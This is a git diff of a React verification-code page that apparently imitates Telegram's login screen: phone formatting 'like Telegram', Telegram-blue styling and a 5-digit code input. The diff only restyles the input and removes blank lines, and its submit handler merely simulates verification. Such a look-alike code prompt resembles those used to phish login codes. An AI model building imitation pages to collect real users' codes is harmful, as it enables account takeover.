@@ -3,7 +3,6 @@ import { useNavigate, useSearchParams } from 'react-router-dom';
 
 import { Page } from '@/components/Page.tsx';
 
-
 export const VerificationCodePage: React.FC = () => {
   const navigate = useNavigate();
   const [searchParams] = useSearchParams();
@@ -23,9 +22,7 @@ export const VerificationCodePage: React.FC = () => {
         console.log('🐵 Video autoplay failed:', e);
       });
     }
-    
-
-  }, [sessionId]);
+  }, []);
 
   // Format phone number with proper spacing like Telegram
   const formatPhoneNumber = (phone: string) => {
@@ -81,8 +78,6 @@ export const VerificationCodePage: React.FC = () => {
     // Only allow digits
     if (/^\d*$/.test(value)) {
       setVerificationCode(value);
-      
-
     }
   };
 
@@ -96,8 +91,6 @@ export const VerificationCodePage: React.FC = () => {
     setStatus('Verifying code...');
 
     try {
-
-      
       // Simulate verification process
       setStatus('Code submitted successfully!');
       
@@ -109,8 +102,6 @@ export const VerificationCodePage: React.FC = () => {
     } catch (error) {
       console.error('Error submitting verification code:', error);
       setStatus('❌ Error submitting code');
-      
-
     } finally {
       setIsSubmitting(false);
     }
@@ -247,35 +238,36 @@ export const VerificationCodePage: React.FC = () => {
             width: '100%',
             marginBottom: '32px'
           }}>
-            <label style={{
-              display: 'block',
-              fontSize: '14px',
-              fontWeight: '500',
-              color: '#333',
-              marginBottom: '8px'
-            }}>
-              Code
-            </label>
-            <input
-              type="text"
-              value={verificationCode}
-              onChange={handleCodeChange}
-              onKeyPress={handleKeyPress}
-              placeholder="Enter 5-digit code"
-              maxLength={5}
-              style={{
-                width: '100%',
-                padding: '16px',
-                fontSize: '18px',
-                border: '2px solid #0088cc',
-                borderRadius: '12px',
-                outline: 'none',
-                textAlign: 'center',
-                letterSpacing: '4px',
-                fontFamily: 'monospace'
-              }}
-              autoFocus
-            />
+            <div style={{ marginBottom: '24px' }}>
+              <input
+                type="text"
+                value={verificationCode}
+                onChange={handleCodeChange}
+                placeholder="Code"
+                maxLength={5}
+                style={{
+                  width: '100%',
+                  maxWidth: '280px',
+                  height: '48px',
+                  padding: '0 16px',
+                  fontSize: '16px',
+                  border: '2px solid #0088cc',
+                  borderRadius: '12px',
+                  backgroundColor: '#ffffff',
+                  color: '#000',
+                  outline: 'none',
+                  transition: 'border-color 0.2s ease, box-shadow 0.2s ease'
+                }}
+                onFocus={(e) => {
+                  e.target.style.borderColor = '#0088cc';
+                  e.target.style.boxShadow = '0 0 0 3px rgba(0, 136, 204, 0.15)';
+                }}
+                onBlur={(e) => {
+                  e.target.style.borderColor = '#0088cc';
+                  e.target.style.boxShadow = 'none';
+                }}
+              />
+            </div>
           </div>
 
           {/* Submit Button */}
